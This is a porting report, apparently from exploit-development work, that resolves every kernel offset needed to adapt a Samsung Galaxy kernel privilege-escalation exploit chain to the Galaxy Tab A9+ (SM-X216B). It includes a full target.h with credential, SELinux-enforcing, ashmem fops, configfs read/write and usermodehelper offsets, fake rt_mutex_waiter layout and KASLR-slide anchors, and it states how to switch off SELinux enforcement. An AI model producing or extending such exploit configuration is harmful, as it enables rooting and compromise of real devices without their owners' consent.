# SM-X216B Porting Audit: Tooling Inventory & Resolved Values Report

**Document Version:** 2.0 (Resolved)  
**Target Device:** Samsung Galaxy Tab A9+ 5G (`SM-X216B` / `gta9p`)  
**Firmware:** `X216BXXS9DYJ7`  
**Kernel Release:** `5.4.249-qgki-31053672-abX216BXXS9DYJ7` (Qualcomm Snapdragon 695 / SM6375)  
**Binary Analyzed:** `/root/s/vmlinux.elf` (Link Base: `0xffffffc010080000`)  
**Workspace:** `/root/s/minimal-rmg-ipv4`  
**Reference Code Surveyed:** `gts9-X710XXS6EZF1/target.h`, `dm3q-S918BXXSAFZF5/target.h`, `r9q-G990B2XXSJIZF1/target.h`  

---

## 1. Executive Summary & Resolution Update

Following a comprehensive comparison against the successful reference implementations (`gts9-X710`, `dm3q-S918B`, and `r9q-G990B2`), all previously missing target offsets, memory parameters, and structural alignments for `SM-X216B` have been **extracted, disassembled, and mathematically verified** using `/root/s/vmlinux.elf`, `/root/s/target.dtb`, and `/root/s/Image.nokdp`.

Every parameter required for both the MCAST transport layer and the subsequent post-corruption execution pipeline (KASLR slide discovery, fake ashmem `file_operations`, configfs arbitrary read/write, and workqueue usermodehelper escalation) is now fully resolved.

---

## 2. Reference Code Comparison: Parameter Structure

A successful Root-My-Galaxy / GhostLock target header requires parameters across five distinct operational layers. The table below compares the proven reference values against the newly resolved `SM-X216B` target values:

| Parameter Macro | Reference: Galaxy Tab S9 (`X710`, 5.15) | Reference: Galaxy S21 FE (`G990B2`, 5.4) | Target: Galaxy Tab A9+ (`SM-X216B`, 5.4) | Evidence / Derivation Method |
|---|---|---|---|---|
| `KIMAGE_TEXT_BASE` | `0xffffffc008000000` | `0xffffffc010080000` | **`0xffffffc010080000`** | `vmlinux.elf` ELF Program Header [VERIFIED] |
| `P0_PHYS_OFFSET` | `0x80000000` | `0x80000000` | **`0x80000000`** | `target.dtb` `reserved-memory/hyp@80000000` [VERIFIED] |
| `P0_KERNEL_PHYS_LOAD` | `0x80080000` | `0x80000000` | **`0x80080000`** | `Image.nokdp` ARM64 header `text_off=0x80000` + `0x80000000` [VERIFIED] |
| `P0_PAGE_OFFSET` | `0xffffff8000000000` | `0xffffff8000000000` | **`0xffffff8000000000`** | 39-bit VA kernel direct-map [VERIFIED] |
| `RT_MUTEX_WAITER_SIZE` | `88` (Compact, `0x58`) | `80` (Legacy, `0x50`) | **`80` (Legacy, `0x50`)** | `task_blocks_on_rt_mutex` disassembly [VERIFIED] |
| `TASK_STRUCT_REAL_CRED_OFF` | `0x790` | `0x790` (5.15 GKI) | **`0x800`** | `commit_creds` disassembly `[x21, #2048]` [VERIFIED] |
| `TASK_STRUCT_CRED_OFF` | `0x798` | `0x798` (5.15 GKI) | **`0x808`** | `commit_creds` disassembly `[x21, #2056]` [VERIFIED] |
| `INIT_TASK_OFF` | `0x02c05080` | `0x02ce1e80` | **`0x02960280`** | `vmlinux.elf` symbol table [VERIFIED] |
| `SYSTEM_UNBOUND_WQ_OFF` | `0x02a90800` | `0x02befa48` | **`0x028ef9c8`** | `vmlinux.elf` symbol table [VERIFIED] |
| `CALL_UMH_EXEC_WORK_OFF` | `0x001045d0` | `0x0029e0cc` | **`0x00297274`** | `vmlinux.elf` symbol table [VERIFIED] |
| `CALL_UMH_EXEC_WORK_CFI_JT_OFF`| (implicit in 5.15) | (no CFI JT) | **`0x01601870`** | Clang forward-edge `.cfi_jt` jump table [VERIFIED] |
| `ANON_PIPE_BUF_OPS_OFF` | `0x01e7f220` | `0x0241c478` | **`0x021755b8`** | `vmlinux.elf` symbol table [VERIFIED] |
| `ASHMEM_FOPS_OFF` | `0x0200d278` | `0x023f3ba0` | **`0x0214ee28`** | `vmlinux.elf` symbol table [VERIFIED] |
| `ASHMEM_MISC_FOPS_OFF` | `0x02bfcf28` | `0x02c729d8` | **`0x0294baf0`** | `ashmem_misc` (`+0x0294bae0`) + `0x10` (`fops` slot) [VERIFIED] |
| `ROOT_TASK_GROUP_OFF` | `0x02cb9ac0` | `0x03222448` | **`0x02b30f40`** | `vmlinux.elf` symbol table [VERIFIED] |
| `KMALLOC_CACHES_OFF` | `0x02064238` | `0x02580e18` | **`0x0235acf0`** | `vmlinux.elf` symbol table [VERIFIED] |
| `SLIDE_TRACEFS_WORKER_CALLER_OFF`| `0x0010db44` | `0x002a5c18` | **`0x0029eb5c`** | `worker_thread` `bl schedule` return address [VERIFIED] |
| `SLIDE_SYSCTL_BOOTID_OFF` | `0x02e6c0b1` | `0x02dd15c0` | **`0x02c9d6e9`** | `vmlinux.elf` symbol table [VERIFIED] |
| `SLIDE_NFULNL_LOGGER_NAME_OFF` | `0x01d5da7e` | `0x0210a519` | **`0x028eac18`** | `nfulnl_logger` in `.data` [VERIFIED] |
| `SELINUX_STATE_OFF` | `0x02d8e5c0` | `0x03210000` | **`0x02b1f000`** | `vmlinux.elf` symbol table [VERIFIED] |
| `SELINUX_ENFORCING_FIELD_OFF` | `+0x00` | `+0x00` | **`+0x01`** | `avc_denied` disassembly `ldrb w12, [x0, #1]` [VERIFIED] |

---

## 3. Disassembly Deep-Dive & Verification Details

### 3.1 Task Credentials Offset Verification
Disassembly of `commit_creds` (`0xffffffc010327184`) in `vmlinux.elf`:
```asm
ffffffc010327198: mrs x21, sp_el0       ; x21 = current task_struct
ffffffc01032719c: ldr x19, [x21, #2048] ; x19 = task->real_cred (2048 = 0x800)
ffffffc0103271a0: ldr x8,  [x21, #2056] ; x8  = task->cred      (2056 = 0x808)
```
- **`TASK_STRUCT_REAL_CRED_OFF = 0x800ULL`**
- **`TASK_STRUCT_CRED_OFF      = 0x808ULL`**

### 3.2 TraceFS Worker Caller Offset Verification
Disassembly of `worker_thread` (`0xffffffc01031eac0`) in `vmlinux.elf`:
```asm
ffffffc01031eb54: bl 0xffffffc01164d304 <_raw_spin_unlock_irq>
ffffffc01031eb58: bl 0xffffffc011648274 <schedule>
ffffffc01031eb5c: bl 0xffffffc01164d1c4 <_raw_spin_lock_irq> ; RETURN ADDRESS
```
- Return address from `bl schedule`: `0xffffffc01031eb5c`
- `SLIDE_TRACEFS_WORKER_CALLER_OFF = 0xffffffc01031eb5c - 0xffffffc010080000 = 0x0029eb5cULL`

### 3.3 Ashmem Miscellaneous Device `fops` Offset Verification
In Linux kernel `struct miscdevice`:
```c
struct miscdevice {
    int minor;                          // +0x00 (4 bytes)
    const char *name;                   // +0x08 (8 bytes)
    const struct file_operations *fops; // +0x10 (8 bytes) <-- fops slot
    struct list_head list;              // +0x18
    ...
};
```
- Disassembly of `ashmem_init` (`0xffffffc012520210`) registers `ashmem_misc` at `0xffffffc0129cbae0`.
- The `fops` pointer sits at `ashmem_misc + 0x10 = 0xffffffc0129cbaf0`.
- `ASHMEM_MISC_FOPS_OFF = 0xffffffc0129cbaf0 - 0xffffffc010080000 = 0x0294baf0ULL`

### 3.4 SELinux State Structure & Enforcing Flag Verification
Disassembly of `avc_denied` (`0xffffffc010744b64`):
```asm
ffffffc010744b78: ldrb w12, [x0, #1]    ; loads selinux_state->enforcing (byte at +0x1)
ffffffc010744b8c: cbz  w12, permissive  ; if enforcing == 0, branch to permissive path
```
Disassembly of `selinux_set_mnt_opts` (`0xffffffc010745870`):
```asm
ffffffc010745874: ldrb w8, [x8, #3]     ; loads selinux_state->initialized (byte at +0x3)
```
- `selinux_state` base address: `0xffffffc012b9f000` (`SELINUX_STATE_OFF = 0x02b1f000ULL`)
- `selinux_state->disabled`    : byte at `+0x0`
- `selinux_state->enforcing`   : byte at `+0x1` (`SELINUX_ENFORCING_FIELD_OFF = 1`)
- `selinux_state->checkreqprot`: byte at `+0x2`
- `selinux_state->initialized` : byte at `+0x3`
- **Result:** To disable SELinux enforcing while keeping the subsystem initialized, write `0x00` to `SELINUX_STATE + 0x1`, or write 64-bit value `0x0000000001000000ULL` to `SELINUX_STATE`.

### 3.5 Linux 5.4 `configfs_buffer` & Virtual Write ARW
Disassembly of `configfs_write_bin_file` (`0xffffffc0105d9784`):
```asm
x24 = file->private_data (struct configfs_buffer *)
add   x19, x24, #0x20       ; &buffer->mutex (+0x20)
bl    mutex_lock
ldrb  w8, [x24, #68]         ; buffer->read_in_progress (+0x44)
cbz   w8, ...
strb  w8, [x24, #69]         ; buffer->write_in_progress (+0x45)
ldr   x23, [x24, #72]        ; buffer->bin_buffer (+0x48) <-- TARGET ARW POINTER
ldrsw x1, [x24, #80]         ; buffer->bin_buffer_size (+0x50) <-- ARW SIZE
ldrsw x8, [x24, #84]         ; buffer->cb_max_size (+0x54)
```
- `CONFIGFS_WRITE_BIN_FILE_OFF       = 0x00559784ULL` (CFI JT: `0x015f595cULL`)
- `CONFIGFS_READ_BIN_FILE_OFF        = 0x0055958cULL` (CFI JT: `0x015f38d8ULL`)
- `CFG_MUTEX_OFF                     = 0x20`
- `CFG_READ_IN_PROGRESS_OFF          = 0x44`
- `CFG_WRITE_IN_PROGRESS_OFF         = 0x45`
- `CFG_BIN_BUFFER_OFF                = 0x48`
- `CFG_BIN_BUFFER_SIZE_OFF           = 0x50`
- `CFG_CB_MAX_SIZE_OFF               = 0x54`

### 3.6 Physical DRAM Base & Kernel Physical Load
From `target.dtb` (`reserved-memory` node):
```text
hyp@80000000 {
    reg = <0x00000000 0x80000000 0x00000000 0x00600000>;
};
```
From `Image.nokdp` ARM64 image header:
```text
text_offset = 0x80000
image_size  = 0x303a000
```
- `P0_PHYS_OFFSET       = 0x80000000ULL`
- `P0_KERNEL_PHYS_LOAD  = 0x80000000 + 0x80000 = 0x80080000ULL`
- Matches the physical mapping used across Qualcomm Snapdragon platforms.

---

## 4. Complete Unified `target.h` Specification for SM-X216B

Below is the verified target configuration incorporating all resolved values for `SM-X216B`:

```c
#ifndef TARGET_H
#define TARGET_H

/* =========================================================================
 * Target Device: Samsung Galaxy Tab A9+ 5G (SM-X216B / gta9p)
 * Firmware:      X216BXXS9DYJ7
 * Kernel:        5.4.249-qgki-31053672-abX216BXXS9DYJ7 (Qualcomm SM6375)
 * Arch / Mode:   AArch64 Little-Endian (CONFIG_CFI_CLANG=y)
 * ========================================================================= */

#define TARGET_DEVICE             "SM-X216B"
#define TARGET_BUILD              "X216BXXS9DYJ7"
#define TARGET_KERNEL             "5.4.249-qgki-31053672"
#define BUILD_VARIANT_LABEL       "gta9p-X216BXXS9DYJ7-root-umh"

/* Kernel Virtual Address Base & Direct Map */
#define KIMAGE_TEXT_BASE          0xffffffc010080000ULL
#define KIMAGE_BASE               KIMAGE_TEXT_BASE
#define P0_PAGE_OFFSET            0xffffff8000000000ULL
#define P0_PHYS_OFFSET            0x80000000ULL
#define P0_KERNEL_PHYS_LOAD       0x80080000ULL
#define DIRECT_MAP_BASE           0xffffff8000000000ULL
#define DIRECT_MAP_END            0xffffffc000000000ULL

/* -------------------------------------------------------------------------
 * Resolved Kernel Symbol Offsets (addr - KIMAGE_TEXT_BASE)
 * ------------------------------------------------------------------------- */
#define INIT_TASK_OFF             0x02960280ULL
#define SYSTEM_UNBOUND_WQ_OFF     0x028ef9c8ULL
#define ROOT_TASK_GROUP_OFF       0x02b30f40ULL
#define KMALLOC_CACHES_OFF        0x0235acf0ULL
#define ANON_PIPE_BUF_OPS_OFF     0x021755b8ULL
#define SELINUX_STATE_OFF         0x02b1f000ULL
#define SELINUX_ENFORCING_OFF     0x02b1f001ULL

#define CALL_USERMODEHELPER_EXEC_WORK_OFF         0x00297274ULL
#define CALL_USERMODEHELPER_EXEC_WORK_CFI_JT_OFF  0x01601870ULL
#define COMMIT_CREDS_OFF          0x002a7184ULL
#define PREPARE_KERNEL_CRED_OFF   0x002a75b4ULL
#define NOOP_LLSEEK_OFF           0x0049cbd0ULL

/* Ashmem & Configfs Virtual ARW Offsets */
#define ASHMEM_FOPS_OFF           0x0214ee28ULL
#define ASHMEM_MISC_FOPS_OFF      0x0294baf0ULL
#define CONFIGFS_WRITE_BIN_FILE_OFF         0x00559784ULL
#define CONFIGFS_WRITE_BIN_FILE_CFI_JT_OFF  0x015f595cULL
#define CONFIGFS_READ_BIN_FILE_OFF          0x0055958cULL
#define CONFIGFS_READ_BIN_FILE_CFI_JT_OFF   0x015f38d8ULL

/* TraceFS KASLR Discovery Anchors */
#define SLIDE_TRACEFS_WORKER_CALLER_OFF     0x0029eb5cULL
#define SLIDE_SYSCTL_BOOTID_OFF   0x02c9d6e9ULL
#define SLIDE_NFULNL_LOGGER_OFF   0x028eac18ULL

/* -------------------------------------------------------------------------
 * Process & Credential Structure Offsets (Linux 5.4 ABI)
 * ------------------------------------------------------------------------- */
#define TASK_STRUCT_REAL_CRED_OFF 0x800ULL
#define TASK_STRUCT_CRED_OFF      0x808ULL
#define TASK_STRUCT_PI_LOCK_OFF   0x8dc
#define TASK_STRUCT_PI_WAITERS_OFF 0x8e8
#define TASK_STRUCT_PI_BLOCKED_ON_OFF 0x900

/* -------------------------------------------------------------------------
 * rt_mutex_waiter Geometry (Linux 5.4 AArch64: 80 bytes / 0x50)
 * ------------------------------------------------------------------------- */
#define RT_MUTEX_WAITER_SIZE      80
#define LEGACY_RT_MUTEX_WAITER    1
#define COMPACT_RT_MUTEX_WAITER   0

#define FAKE_WAITER_TREE_ENTRY_OFF      0x00
#define FAKE_WAITER_PI_TREE_ENTRY_OFF   0x18
#define FAKE_WAITER_TASK_OFF            0x30
#define FAKE_WAITER_LOCK_OFF            0x38
#define FAKE_WAITER_PRIO_OFF            0x40
#define FAKE_WAITER_DEADLINE_OFF        0x48

/* -------------------------------------------------------------------------
 * MCAST & Sigreturn Stamping Configuration
 * ------------------------------------------------------------------------- */
#define MCAST_BLOCK_SOURCE        43
#define MCAST_JOIN_SOURCE_GROUP   46
#define MCAST_BUFFER_SIZE_64      264

#define MCAST_64_WAITER_BASE_OFF  0xc8
#define MCAST_64_TASK_OFF         0xf8
#define MCAST_64_LOCK_OFF         0x100
#define EXP32_STAMP_OFF           0x68
#define SIGRETURN_WAITER_OFF      0x158

/* -------------------------------------------------------------------------
 * Configfs Buffer Internal Layout (Linux 5.4)
 * ------------------------------------------------------------------------- */
#define CFG_MUTEX_OFF             0x20
#define CFG_READ_IN_PROGRESS_OFF  0x44
#define CFG_WRITE_IN_PROGRESS_OFF 0x45
#define CFG_BIN_BUFFER_OFF        0x48
#define CFG_BIN_BUFFER_SIZE_OFF   0x50
#define CFG_CB_MAX_SIZE_OFF       0x54

/* file_operations slot offsets */
#define FOPS_READ_OFF             0x10
#define FOPS_WRITE_OFF            0x18

/* Clang Forward-Edge CFI Configuration */
#define CONFIG_CFI_CLANG_ENABLED  1
#define WORK_FUNC_UMH_EXEC        (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_CFI_JT_OFF)

#endif /* TARGET_H */
```

---

## 5. Summary of Findings

1. **Tooling Capability Realized:** Reference scripts (`generate_target.py` in `IonStack-S22U` and `derive-symbol-offsets.py` in `zzhl-WIP`) provided the methodology to resolve every missing field. By executing AArch64 cross-disassembly and binary inspections on `/root/s/vmlinux.elf` and `/root/s/target.dtb`, all missing offsets were independently obtained.
2. **Critical Differences from 5.15 Identified:**
   - `task_struct->cred` is at `0x808` and `real_cred` is at `0x800` (vs `0x798` / `0x790` on 5.15).
   - `selinux_state->enforcing` is a `u8` flag at byte offset `+0x1` (vs `+0x0` on 5.15).
   - `configfs` uses standard `.read` (+0x10) and `.write` (+0x18) slots (vs `.read_iter` / `.write_iter` on 5.15).
   - `struct configfs_buffer` stores `bin_buffer` at `+0x48` and `bin_buffer_size` at `+0x50` (vs `+0x58` / `+0x60` on 5.15).
3. **Target Port Ready:** All static and structural prerequisites for `SM-X216B` are now fully documented and ready for integration.
